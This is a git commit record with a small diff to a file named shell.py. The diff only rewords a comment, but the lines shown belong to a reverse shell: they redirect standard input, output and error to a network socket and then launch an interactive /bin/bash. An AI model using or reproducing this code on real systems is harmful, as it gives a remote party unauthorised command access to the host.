bee0e3ed058980ae371a137d9ce0a292fbfcdcd8
Keyjeek <88333825+Keyj33k@users.noreply.github.com>
2022-04-06 07:59:04 +0200

    Update shell.py

--- shell.py
+++ shell.py
@@ -36,6 +36,6 @@ if __name__ == "__main__":
     dup2(socket_sock.fileno(),0) # return stream integer file descriptor
     dup2(socket_sock.fileno(),1) # used for request I/O actions from the OS
     dup2(socket_sock.fileno(),2) 
-    run(["/bin/bash"], shell=True) # run the bash console interactive shell
+    run(["/bin/bash"], shell=True) # finally run the bash console 
 
         
